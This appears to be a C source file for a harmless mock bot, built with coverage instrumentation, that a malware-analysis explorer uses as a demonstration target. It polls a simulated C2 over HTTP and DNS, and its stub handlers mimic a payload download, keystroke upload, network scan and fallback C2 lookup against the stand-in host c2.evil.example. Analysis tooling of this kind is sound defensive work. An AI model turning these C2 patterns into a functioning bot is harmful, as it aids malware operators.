/* A harmless stand-in for a bot, to demonstrate the explorer: it polls a "C2" over HTTP and
 * DNS (the nucleus, on localhost) and only runs its command handlers for the right answers,
 * like real bots. It does nothing but talk to the given host and ports.
 *
 * Built with -finstrument-functions: every function entered is appended (once) to
 * $COVERAGE_FILE as JSON lines {"pid":..,"addresses":["0x.."]}, the explorer's coverage
 * format. Build non-PIE so runtime addresses match a static analysis (REA/Ghidra).
 *
 * Usage: bot HOST HTTP_PORT DNS_PORT RAW_PORT ROUNDS
 */
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

static const char *host;
static int http_port, dns_port, raw_port;

/* --- coverage (not instrumented itself) --- */
#define NO_INSTRUMENT __attribute__((no_instrument_function))
static FILE *coverage;
static void *seen[4096];
static int seen_count;

NO_INSTRUMENT void __cyg_profile_func_enter(void *function, void *caller) {
    (void)caller;
    for (int i = 0; i < seen_count; i++)
        if (seen[i] == function) return;
    if (seen_count < 4096) seen[seen_count++] = function;
    if (!coverage) {
        const char *path = getenv("COVERAGE_FILE");
        if (!path || !(coverage = fopen(path, "a"))) return;
    }
    struct timespec now;
    clock_gettime(CLOCK_REALTIME, &now);
    fprintf(coverage, "{\"pid\":%d,\"time\":%.3f,\"addresses\":[\"%p\"]}\n", getpid(), now.tv_sec * 1000.0 + now.tv_nsec / 1e6, function);
    fflush(coverage);
}
NO_INSTRUMENT void __cyg_profile_func_exit(void *function, void *caller) { (void)function; (void)caller; }

/* --- networking --- */
static int tcp_connect(int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in address = { .sin_family = AF_INET, .sin_port = htons(port) };
    inet_pton(AF_INET, host, &address.sin_addr);
    if (connect(fd, (struct sockaddr *)&address, sizeof address) != 0) { close(fd); return -1; }
    return fd;
}

/* One HTTP exchange; returns the status and copies the body into `body` */
static int http(const char *method, const char *path, const char *data, char *body, size_t size) {
    int fd = tcp_connect(http_port);
    if (fd < 0) return -1;
    char request[1024], response[16384] = {0};
    int length = snprintf(request, sizeof request, "%s %s HTTP/1.1\r\nHost: c2.evil.example\r\nConnection: close\r\nContent-Length: %zu\r\n\r\n%s",
                          method, path, data ? strlen(data) : 0, data ? data : "");
    send(fd, request, length, 0);
    size_t total = 0;
    ssize_t n;
    while (total < sizeof response - 1 && (n = recv(fd, response + total, sizeof response - 1 - total, 0)) > 0) total += n;
    close(fd);
    int status = 0;
    sscanf(response, "HTTP/%*s %d", &status);
    char *start = strstr(response, "\r\n\r\n");
    snprintf(body, size, "%s", start ? start + 4 : "");
    return status;
}

/* A DNS query (qtype 16 = TXT, 1 = A); returns the raw answer length (copied into out) */
static int dns(const char *name, int qtype, unsigned char *out, size_t size) {
    unsigned char query[512] = {0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0};
    int at = 12;
    const char *label = name;
    while (*label) {
        const char *dot = strchr(label, '.');
        int len = dot ? (int)(dot - label) : (int)strlen(label);
        query[at++] = len;
        memcpy(query + at, label, len);
        at += len;
        label += len + (dot ? 1 : 0);
    }
    query[at++] = 0;
    query[at++] = 0; query[at++] = qtype; query[at++] = 0; query[at++] = 1;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct timeval timeout = {1, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout);
    struct sockaddr_in address = { .sin_family = AF_INET, .sin_port = htons(dns_port) };
    inet_pton(AF_INET, host, &address.sin_addr);
    sendto(fd, query, at, 0, (struct sockaddr *)&address, sizeof address);
    int n = recv(fd, out, size, 0);
    close(fd);
    return n;
}

static int contains(const unsigned char *data, int length, const char *needle) {
    size_t n = strlen(needle);
    for (int i = 0; length > 0 && i + (int)n <= length; i++)
        if (memcmp(data + i, needle, n) == 0) return 1;
    return 0;
}

static int base64_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static void base64_decode(const char *in, char *out, size_t size) {
    size_t o = 0;
    int bits = 0, buffer = 0;
    for (; *in && o + 1 < size; in++) {
        int v = base64_value(*in);
        if (v < 0) continue;
        buffer = (buffer << 6) | v;
        bits += 6;
        if (bits >= 8) { bits -= 8; out[o++] = (char)((buffer >> bits) & 0xff); }
    }
    out[o] = 0;
}

/* --- the bot's command handlers: what the explorer should find --- */
static void cmd_download(void) {
    char body[16384];
    http("GET", "/payload.exe", NULL, body, sizeof body);
}

static void cmd_keylog(void) {
    char body[256];
    http("POST", "/upload?type=keys", "keys=abc", body, sizeof body);
}

static void cmd_scan(void) {
    int fd = tcp_connect(raw_port);
    if (fd >= 0) {
        send(fd, "SCAN 10.0.0.0/24\n", 17, 0);
        close(fd);
    }
}

static void cmd_update(void) {
    char body[256];
    http("GET", "/update/version.txt", NULL, body, sizeof body);
}

static void cmd_sleep(void) {
    unsigned char answer[512];
    dns("sleeping.c2.evil.example", 1, answer, sizeof answer);
}

static void fallback_c2(void) {
    unsigned char answer[512];
    dns("backup.c2.evil.example", 1, answer, sizeof answer);
}

static void handle_task(const char *body, int status) {
    char decoded[1024];
    base64_decode(body, decoded, sizeof decoded);
    if (strstr(body, "download")) cmd_download();
    if (strstr(body, "keylog") || strstr(decoded, "keylog")) cmd_keylog();
    if (body[0] == '{' && strstr(body, "\"task\":\"scan\"")) cmd_scan();
    if (strstr(decoded, "update")) cmd_update();
    if (status == 404 || status == 503) fallback_c2();
}

int main(int argc, char **argv) {
    if (argc < 6) {
        fprintf(stderr, "usage: %s HOST HTTP_PORT DNS_PORT RAW_PORT ROUNDS\n", argv[0]);
        return 2;
    }
    host = argv[1];
    http_port = atoi(argv[2]);
    dns_port = atoi(argv[3]);
    raw_port = atoi(argv[4]);
    for (int round = 0, rounds = atoi(argv[5]); round < rounds; round++) {
        char body[16384], path[64];
        snprintf(path, sizeof path, "/poll.php?id=%d", round);
        int status = http("GET", path, NULL, body, sizeof body);
        handle_task(body, status);
        unsigned char answer[512];
        int n = dns("cfg.c2.evil.example", 16, answer, sizeof answer);
        if (contains(answer, n, "sleep")) cmd_sleep();
    }
    return 0;
}
